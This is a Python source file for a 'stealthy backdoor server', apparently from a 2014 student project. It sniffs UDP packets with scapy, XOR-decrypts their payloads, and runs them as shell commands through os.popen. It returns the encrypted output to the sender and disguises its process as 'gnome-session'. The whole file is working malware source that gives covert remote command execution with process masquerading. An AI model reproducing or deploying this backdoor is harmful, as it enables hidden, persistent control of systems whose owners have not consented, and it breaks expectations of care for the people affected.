############################################################################################################
##	SOURCE FILE:		backdoor.py - A stealthy backdoor server that can execute remote commands
##
##	PROGRAM:		    backdoor
##
##	FUNCTIONS:		    xor_crypt
##                      remoteExecute
##
##	LAST MODIFIED:		October 4, 2014
##
##	DESIGNERS:	        Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:        Slade Solobay & Zach Smoroden
##
##	NOTES:
##	This program listens for the client to send remote commands. They will be run, and the results sent
##  back to the client encrypted.
##
##  OUTPUT: commands/data is printed to standard out to easily see what is happening while testing.
##
##	USAGE: python backdoor.py
##
##############################################################################################################

import setproctitle
import sys
from scapy.all import*
import time
import os
from itertools import izip, cycle

################ USER DEFINED ########################################
INTERFACE_ = 'em1'

# Ports must be the same as the client.
SPORT = 8000
DPORT = 7999

# Filter is tcpdump format
FILTER = "udp and src port {0} and dst port {1}".format(SPORT, DPORT)

# Must make sure it is the same as the client
KEY = "zdehjk"
######################################################################



######################################################################
##	FUNCTION:	    xor_crypt
##
##	INTERFACE:	    xor_crypt(data, key=KEY, encode=False, decode=False)
##
##				    data:   The payload of the packet sent from the client that contains the
##                          command to execute
##                  key:    The encryption key. Defaults to the user-defined variable KEY
##                  encode: When true, encrypt the data. Default is False.
##                  decode: When true, decode the data. Default is False.
##
##	RETURNS:        The encoded or decoded data.
##
##	LAST MODIFIED:  October 5, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        Use this function for both encryption and decryption. only one of encode/decode needs to be
##          specified in the call.
##
######################################################################
def xor_crypt(data, key=KEY, encode=False, decode=False):
    if decode:
        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(key)))
    if encode:
        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(key)))
    return message

######################################################################
##	FUNCTION:	    remoteExecute
##
##	INTERFACE:	    remoteExecute(packet)
##
##				    packet:   The packet that was caught by the sniffer and is from the client.
##
##	RETURNS:        Sends response to client, prints info.
##
##	LAST MODIFIED:  October 5, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This is a callback for the sniff() call. Any packet captured will come through here.
##
######################################################################
def remoteExecute(packet):
    print "Running Command: " + xor_crypt(packet.load, decode=True)
    command = os.popen(xor_crypt(packet.load, decode=True))
    command_result = command.read()
    print command_result

    dest_ip = packet[0][1].src
    print "Sending encrypted response.."
    send(IP(dst=dest_ip)/UDP(sport=DPORT, dport=SPORT)/xor_crypt(command_result, encode=True))

    return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst

###### START OF SCRIPT #######
# To show the user what it is listening for.
print FILTER

# Masks the process.
setproctitle.setproctitle('gnome-session')

# Start sniffing for packets
sniff(filter=FILTER, prn=remoteExecute)